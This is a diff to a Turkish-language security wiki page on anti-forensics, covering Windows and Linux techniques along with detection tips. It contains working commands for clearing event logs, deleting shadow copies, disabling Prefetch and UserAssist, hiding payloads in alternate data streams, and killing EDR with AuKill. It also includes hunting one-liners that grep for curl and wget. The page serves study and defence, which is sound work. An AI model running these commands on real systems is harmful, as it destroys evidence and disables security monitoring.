@@ -5,33 +5,33 @@
 ## Zaman Damgaları
 
 Bir saldırgan, **dosyaların zaman damgalarını değiştirmekle** ilgilenebilir.\
-Zaman damgalarını MFT içinde `$STANDARD_INFORMATION` \_\_ ve \_\_ `$FILE_NAME` özniteliklerinde bulmak mümkündür.
+Zaman damgalarını, MFT içinde `$STANDARD_INFORMATION` \_\_ ve \_\_ `$FILE_NAME` özniteliklerinde bulmak mümkündür.
 
 Her iki öznitelik de 4 zaman damgasına sahiptir: **Değiştirme**, **erişim**, **oluşturma** ve **MFT kayıt değişikliği** (MACE veya MACB).
 
 **Windows gezgini** ve diğer araçlar, **`$STANDARD_INFORMATION`** içindeki bilgileri gösterir.
 
-### TimeStomp - Anti-forensic Aracı
+### TimeStomp - Anti-forensic Tool
 
-Bu araç, **`$STANDARD_INFORMATION`** içindeki zaman damgası bilgilerini **değiştirir** **ama** **`$FILE_NAME`** içindeki bilgileri **değiştirmez**. Bu nedenle, **şüpheli** **etkinlikleri** **belirlemek** mümkündür.
+Bu araç, **`$STANDARD_INFORMATION`** içindeki zaman damgası bilgilerini **değiştirir** **ancak** **`$FILE_NAME`** içindeki bilgileri **değiştirmez**. Bu nedenle, **şüpheli** **faaliyetleri** **belirlemek** mümkündür.
 
 ### Usnjrnl
 
-**USN Journal** (Güncelleme Sırası Numarası Günlüğü), NTFS (Windows NT dosya sistemi) özelliğidir ve hacim değişikliklerini takip eder. [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) aracı, bu değişikliklerin incelenmesini sağlar.
+**USN Journal** (Güncelleme Sırası Numarası Günlüğü), NTFS (Windows NT dosya sistemi) özelliğidir ve hacim değişikliklerini takip eder. [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) aracı, bu değişikliklerin incelenmesine olanak tanır.
 
 ![](<../../images/image (801).png>)
 
-Önceki resim, dosya üzerinde bazı **değişikliklerin yapıldığını** gözlemleyebileceğimiz **aracın** gösterdiği **çıktıdır**.
+Önceki resim, dosya üzerinde bazı **değişikliklerin yapıldığını** gözlemleyebileceğimiz **araç** tarafından gösterilen **çıktıdır**.
 
 ### $LogFile
 
-**Bir dosya sistemine yapılan tüm meta veri değişiklikleri**, [ön yazma günlüğü](https://en.wikipedia.org/wiki/Write-ahead_logging) olarak bilinen bir süreçte kaydedilir. Kaydedilen meta veriler, NTFS dosya sisteminin kök dizininde bulunan `**$LogFile**` adlı bir dosyada tutulur. [LogFileParser](https://github.com/jschicht/LogFileParser) gibi araçlar, bu dosyayı ayrıştırmak ve değişiklikleri belirlemek için kullanılabilir.
+**Bir dosya sistemine yapılan tüm meta veri değişiklikleri**, [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging) olarak bilinen bir süreçte kaydedilir. Kaydedilen meta veriler, NTFS dosya sisteminin kök dizininde bulunan `**$LogFile**` adlı bir dosyada tutulur. [LogFileParser](https://github.com/jschicht/LogFileParser) gibi araçlar, bu dosyayı ayrıştırmak ve değişiklikleri belirlemek için kullanılabilir.
 
 ![](<../../images/image (137).png>)
 
 Yine, aracın çıktısında **bazı değişikliklerin yapıldığını** görmek mümkündür.
 
-Aynı aracı kullanarak **zaman damgalarının ne zaman değiştirildiğini** belirlemek mümkündür:
+Aynı aracı kullanarak, **zaman damgalarının ne zaman değiştirildiğini** belirlemek mümkündür:
 
 ![](<../../images/image (1089).png>)
 
@@ -48,28 +48,28 @@ Aynı aracı kullanarak **zaman damgalarının ne zaman değiştirildiğini** be
 
 **NTFS** zaman damgalarının **kesinliği** **100 nanosecond**'dir. Bu nedenle, 2010-10-10 10:10:**00.000:0000 gibi zaman damgalarına sahip dosyaları bulmak **çok şüphelidir**.
 
-### SetMace - Anti-forensic Aracı
+### SetMace - Anti-forensic Tool
 
 Bu araç, hem `$STARNDAR_INFORMATION` hem de `$FILE_NAME` özniteliklerini değiştirebilir. Ancak, Windows Vista'dan itibaren, bu bilgileri değiştirmek için canlı bir işletim sistemine ihtiyaç vardır.
 
 ## Veri Gizleme
 
-NFTS, bir küme ve minimum bilgi boyutu kullanır. Bu, bir dosya bir buçuk küme kapladığında, **kalan yarımın asla kullanılmayacağı** anlamına gelir. Bu nedenle, bu boş alanda **veri gizlemek mümkündür**.
+NFTS, bir küme ve minimum bilgi boyutu kullanır. Bu, bir dosya bir küme ve yarım küme kapladığında, **kalan yarımın asla kullanılmayacağı** anlamına gelir. Bu nedenle, bu boşlukta **veri gizlemek mümkündür**.
 
 Slacker gibi, bu "gizli" alanda veri gizlemeye olanak tanıyan araçlar vardır. Ancak, `$logfile` ve `$usnjrnl` analizi, bazı verilerin eklendiğini gösterebilir:
 
 ![](<../../images/image (1060).png>)
 
-Daha sonra, FTK Imager gibi araçlar kullanarak boş alanı geri almak mümkündür. Bu tür araçların içeriği obfuscate veya hatta şifreli olarak kaydedebileceğini unutmayın.
+Bu nedenle, FTK Imager gibi araçlar kullanarak boş alanı geri almak mümkündür. Bu tür araçların içeriği obfuscate veya hatta şifreli olarak kaydedebileceğini unutmayın.
 
 ## UsbKill
 
-Bu, **USB** portlarında herhangi bir değişiklik algılandığında bilgisayarı **kapatan** bir araçtır.\
+Bu, **USB** portlarında herhangi bir değişiklik tespit edildiğinde bilgisayarı **kapatan** bir araçtır.\
 Bunu keşfetmenin bir yolu, çalışan süreçleri incelemek ve **her bir python betiğini gözden geçirmektir**.
 
 ## Canlı Linux Dağıtımları
 
-Bu dağıtımlar, **RAM** belleği içinde **çalıştırılır**. Onları tespit etmenin tek yolu, **NTFS dosya sisteminin yazma izinleriyle monte edilmesidir**. Sadece okuma izinleriyle monte edilirse, ihlali tespit etmek mümkün olmayacaktır.
+Bu dağıtımlar **RAM** belleği içinde **çalıştırılır**. Onları tespit etmenin tek yolu, **NTFS dosya sisteminin yazma izinleriyle monte edilmesidir**. Sadece okuma izinleriyle monte edilirse, ihlali tespit etmek mümkün olmayacaktır.
 
 ## Güvenli Silme
 
@@ -85,15 +85,15 @@ Bu, her çalıştırılan yürütülebilir dosyanın tarihlerini ve saatlerini k
 
 UserAssist'i devre dışı bırakmak iki adım gerektirir:
 
-1. UserAssist'i devre dışı bırakmak istediğimizi belirtmek için `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` ve `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled` adlı iki kayıt anahtarını sıfıra ayarlayın.
+1. `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` ve `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled` adlı iki kayıt anahtarını sıfıra ayarlamak, UserAssist'in devre dışı bırakılmasını istediğimizi belirtmek için.
 2. `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>` gibi görünen kayıt alt ağaçlarınızı temizleyin.
 
 ### Zaman Damgalarını Devre Dışı Bırak - Prefetch
 
-Bu, Windows sisteminin performansını artırmak amacıyla çalıştırılan uygulamalar hakkında bilgi kaydedecektir. Ancak, bu adli uygulamalar için de faydalı olabilir.
+Bu, Windows sisteminin performansını artırmak amacıyla çalıştırılan uygulamalar hakkında bilgi kaydedecektir. Ancak, bu adli uygulamalar için de yararlı olabilir.
 
-- `regedit` komutunu çalıştırın
-- Dosya yolunu `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters` olarak seçin
+- `regedit` çalıştırın
+- Dosya yolunu seçin `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
 - Hem `EnablePrefetcher` hem de `EnableSuperfetch` üzerinde sağ tıklayın
 - Her birinin değerini 1 (veya 3) yerine 0 olarak değiştirmek için Değiştir'i seçin
 - Yeniden başlatın
@@ -104,27 +104,27 @@ Bir NTFS hacminden bir klasör açıldığında, sistem, listedeki her klasör i
 
 1. Kayıt Defteri Düzenleyicisini (Regedit.exe) açın.
 2. `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem` yoluna gidin.
-3. `NtfsDisableLastAccessUpdate` anahtarını arayın. Eğer yoksa, bu DWORD'u ekleyin ve değerini 1 olarak ayarlayın, bu işlem devre dışı bırakılacaktır.
+3. `NtfsDisableLastAccessUpdate` anahtarını arayın. Eğer yoksa, bu DWORD'u ekleyin ve değerini 1 olarak ayarlayın, bu işlemi devre dışı bırakacaktır.
 4. Kayıt Defteri Düzenleyicisini kapatın ve sunucuyu yeniden başlatın.
 
 ### USB Geçmişini Sil
 
-Tüm **USB Aygıt Girişleri**, bir USB Aygıtını PC veya Dizüstü Bilgisayarınıza taktığınızda oluşturulan alt anahtarları içeren **USBSTOR** kayıt anahtarı altında Windows Kayıt Defteri'nde saklanır. Bu anahtarı burada bulabilirsiniz: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Bunu silerek** USB geçmişini sileceksiniz.\
+Tüm **USB Aygıt Girişleri**, bir USB Aygıtını PC veya Dizüstü Bilgisayarınıza taktığınızda oluşturulan alt anahtarları içeren **USBSTOR** kayıt anahtarı altında Windows Kayıt Defteri'nde saklanır. Bu anahtarı burada bulabilirsiniz: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Bunu silerek** USB geçmişini silmiş olursunuz.\
 Ayrıca, bunları sildiğinizden emin olmak için [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) aracını kullanabilirsiniz (ve silmek için).
 
 USB'ler hakkında bilgi kaydeden bir diğer dosya, `C:\Windows\INF` içindeki `setupapi.dev.log` dosyasıdır. Bu dosya da silinmelidir.
 
 ### Gölge Kopyalarını Devre Dışı Bırak
 
-**Gölge kopyalarını listeleyin**: `vssadmin list shadowstorage`\
-**Silin**: `vssadmin delete shadow`
+**Gölge kopyaları** listelemek için `vssadmin list shadowstorage`\
+**Silmek için** `vssadmin delete shadow` komutunu çalıştırın.
 
 Ayrıca, [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html) adresinde önerilen adımları izleyerek GUI üzerinden de silebilirsiniz.
 
 Gölge kopyalarını devre dışı bırakmak için [buradaki adımları](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows) izleyin:
 
 1. Windows başlat düğmesine tıkladıktan sonra metin arama kutusuna "services" yazarak Hizmetler programını açın.
-2. Listeden "Hacim Gölge Kopyası"nı bulun, seçin ve sağ tıklayarak Özellikler'e erişin.
+2. Listeden "Volume Shadow Copy"yi bulun, seçin ve sağ tıklayarak Özellikler'e erişin.
 3. "Başlangıç türü" açılır menüsünden Devre Dışı seçeneğini seçin ve ardından değişikliği onaylamak için Uygula ve Tamam'a tıklayın.
 
 Hangi dosyaların gölge kopyasında kopyalanacağını yapılandırmayı da kayıt defterinde `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot` yolunda değiştirmek mümkündür.
@@ -136,7 +136,7 @@ Hangi dosyaların gölge kopyasında kopyalanacağını yapılandırmayı da kay
 
 ### Windows Olay Günlüklerini Sil
 
-- Windows + R --> eventvwr.msc --> "Windows Günlükleri"ni genişletin --> Her bir kategoriye sağ tıklayın ve "Günlüğü Temizle"yi seçin
+- Windows + R --> eventvwr.msc --> "Windows Günlükleri"ni genişletin --> Her kategoriye sağ tıklayın ve "Günlüğü Temizle"yi seçin
 - `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
 - `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`
 
@@ -154,7 +154,7 @@ Hangi dosyaların gölge kopyasında kopyalanacağını yapılandırmayı da kay
 
 ## Gelişmiş Günlükleme & İzleme Manipülasyonu (2023-2025)
 
-### PowerShell ScriptBlock/Modül Günlüğü
+### PowerShell ScriptBlock/Module Logging
 
 Windows 10/11 ve Windows Server'ın son sürümleri, `Microsoft-Windows-PowerShell/Operational` altında **zengin PowerShell adli kalıntıları** tutar (olaylar 4104/4105/4106). Saldırganlar bunları anlık olarak devre dışı bırakabilir veya silebilir:
 ```powershell
@@ -193,25 +193,102 @@ type cobalt.bin > report.pdf:win32res.dll
 rem Execute directly
 wmic process call create "cmd /c report.pdf:win32res.dll"
 ```
-Akışları `dir /R`, `Get-Item -Stream *` veya Sysinternals `streams64.exe` ile listeleyin. Ana makine dosyasını FAT/exFAT'a veya SMB üzerinden kopyalamak, gizli akışı kaldırır ve bu, araştırmacılar tarafından yükü geri almak için kullanılabilir.
+Akışları `dir /R`, `Get-Item -Stream *` veya Sysinternals `streams64.exe` ile listeleyin. Ana makine dosyasını FAT/exFAT'a veya SMB üzerinden kopyalamak gizli akışı kaldırır ve bu, araştırmacılar tarafından yükü geri almak için kullanılabilir.
 
 ### BYOVD & “AuKill” (2023)
 
-Kendi Zayıf Sürücünüzü Getirin, fidye yazılımı ihlallerinde **anti-forensics** için artık rutin olarak kullanılmaktadır. Açık kaynaklı araç **AuKill**, şifreleme ve günlük yok etmeden **önce** EDR ve adli sensörleri askıya almak veya sonlandırmak için imzalı ancak zayıf bir sürücü (`procexp152.sys`) yükler:
+Kendi Zayıf Sürücünüzü Getirin, fidye yazılımı saldırılarında **anti-forensics** için artık rutin olarak kullanılmaktadır. Açık kaynaklı araç **AuKill**, şifreleme ve günlük yok etmeden **önce** EDR ve adli sensörleri askıya almak veya sonlandırmak için imzalı ancak zayıf bir sürücü (`procexp152.sys`) yükler:
 ```cmd
 AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
 AuKill.exe -k CrowdStrike
 ```
-Sürücü daha sonra kaldırılır ve minimal artefaktlar bırakır.  
+Sürücü daha sonra kaldırılır, minimum artefakt bırakır.  
 Önlemler: Microsoft'un savunmasız sürücü kara listesini (HVCI/SAC) etkinleştirin ve kullanıcı yazılabilir yollarından kernel hizmeti oluşturulması hakkında uyarı verin.
 
 ---
 
-## Referanslar
+## Linux Anti-Forensics: Kendinden Yamanma ve Bulut C2 (2023–2025)
 
-- Sophos X-Ops – “AuKill: EDR'yi Devre Dışı Bırakmak İçin Silahlandırılmış Savunmasız Sürücü” (Mart 2023)  
-https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr  
-- Red Canary – “Gizlilik İçin EtwEventWrite'ı Yamanlama: Tespit ve Avlanma” (Haziran 2024)  
-https://redcanary.com/blog/etw-patching-detection  
+### Kendinden yamanmış tehlikeye atılmış hizmetler ile tespiti azaltma (Linux)  
+Düşmanlar, yeniden istismar edilmesini önlemek ve zafiyet tabanlı tespitleri bastırmak için bir hizmeti istismar ettikten hemen sonra giderek daha fazla "kendinden yamanma" yapmaktadır. Amaç, savunmasız bileşenleri en son meşru yukarı akış ikili/jar'ları ile değiştirmektir, böylece tarayıcılar ana bilgisayarı yamalı olarak rapor ederken kalıcılık ve C2 devam eder.
+
+Örnek: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604)  
+- İstismar sonrası, saldırganlar Maven Central'dan (repo1.maven.org) meşru jar'ları aldı, ActiveMQ kurulumundaki savunmasız jar'ları sildi ve aracıyı yeniden başlattı.  
+- Bu, diğer ayak izlerini (cron, SSH yapılandırma değişiklikleri, ayrı C2 implantları) korurken başlangıçtaki RCE'yi kapattı.
+
+Operasyonel örnek (gösterim amaçlı)
+```bash
+# ActiveMQ install root (adjust as needed)
+AMQ_DIR=/opt/activemq
+cd "$AMQ_DIR"/lib
+
+# Fetch patched JARs from Maven Central (versions as appropriate)
+curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
+curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar
+
+# Remove vulnerable files and ensure the service uses the patched ones
+rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
+ln -sf activemq-client-5.18.3.jar activemq-client.jar
+ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar
+
+# Apply changes without removing persistence
+systemctl restart activemq || service activemq restart
+```
+Forensic/hunting tips
+- Zamanlanmamış ikili/JAR değişiklikleri için hizmet dizinlerini gözden geçirin:
+- Debian/Ubuntu: `dpkg -V activemq` ve dosya hash'lerini/yollarını repo aynalarıyla karşılaştırın.
+- RHEL/CentOS: `rpm -Va 'activemq*'`
+- Paket yöneticisi tarafından sahiplenilmeyen veya dışarıdan güncellenmiş sembolik bağlantılar için disk üzerinde mevcut JAR sürümlerini arayın.
+- Zaman çizelgesi: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` ile ctime/mtime'yi uzlaşma penceresi ile ilişkilendirin.
+- Shell geçmişi/proses telemetresi: ilk istismar sonrası `curl`/`wget` ile `repo1.maven.org` veya diğer artefakt CDN'lerine dair kanıt.
+- Değişiklik yönetimi: “yamanın” kim tarafından ve neden uygulandığını doğrulayın, sadece yamanın mevcut olduğunu değil.
+
+### Cloud‑service C2 with bearer tokens and anti‑analysis stagers
+Gözlemlenen ticaret, birden fazla uzun mesafe C2 yolu ve anti-analiz paketlemesini birleştirdi:
+- Sandbox'lamayı ve statik analizi engellemek için şifre korumalı PyInstaller ELF yükleyicileri (örneğin, şifreli PYZ, `/_MEI*` altında geçici çıkarım).
+- Göstergeler: `strings` ile elde edilen `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS` gibi.
+- Çalışma zamanı artefaktları: `/tmp/_MEI*` veya özel `--runtime-tmpdir` yollarına çıkarım.
+- Hardcoded OAuth Bearer token'ları kullanan Dropbox destekli C2
+- Ağ işaretleri: `api.dropboxapi.com` / `content.dropboxapi.com` ile `Authorization: Bearer <token>`.
+- Normalde dosya senkronize etmeyen sunucu iş yüklerinden Dropbox alanlarına dışa doğru HTTPS için proxy/NetFlow/Zeek/Suricata'da avlanın.
+- Bir kanal engellendiğinde kontrolü koruyarak tünelleme (örneğin, Cloudflare Tunnel `cloudflared`) ile paralel/yedek C2.
+- Ana bilgisayar IOCs: `cloudflared` süreçleri/birimleri, `~/.cloudflared/*.json` konfigürasyonu, Cloudflare kenarlarına dışa doğru 443.
+
+### Persistence and “hardening rollback” to maintain access (Linux examples)
+Saldırganlar genellikle kendini yamanayı dayanıklı erişim yollarıyla birleştirir:
+- Cron/Anacron: her `/etc/cron.*/` dizinindeki `0anacron` stub'unda düzenlemeler yaparak periyodik yürütme.
+- Avlanma:
+```bash
+for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
+grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
+```
+- SSH yapılandırma sertleştirme geri alma: kök oturum açmalarını etkinleştirme ve düşük ayrıcalıklı hesaplar için varsayılan shell'leri değiştirme.
+- Kök oturum açma etkinleştirmesini arayın:
+```bash
+grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
+# "yes" gibi bayrak değerleri veya aşırı izinli ayarlar
+```
+- Sistem hesaplarında şüpheli etkileşimli shell'leri arayın (örneğin, `games`):
+```bash
+awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
+```
+- Disk'e bırakılan ve aynı zamanda bulut C2 ile iletişim kuran rastgele, kısa adlandırılmış beacon artefaktları (8 alfabetik karakter):
+- Avlanma:
+```bash
+find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
+-exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
+```
+
+Savunucular, bu artefaktları dışa açılma ve hizmet yamanma olaylarıyla ilişkilendirerek, ilk istismarı gizlemek için kullanılan anti-forensic kendiliğinden düzeltmeyi ortaya çıkarmalıdır.
+
+## References
+
+- Sophos X-Ops – “AuKill: A Weaponized Vulnerable Driver for Disabling EDR” (Mart 2023)
+https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr
+- Red Canary – “Patching EtwEventWrite for Stealth: Detection & Hunting” (Haziran 2024)
+https://redcanary.com/blog/etw-patching-detection
+
+- [Red Canary – Patching for persistence: How DripDropper Linux malware moves through the cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
+- [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
 
 {{#include ../../banners/hacktricks-training.md}}
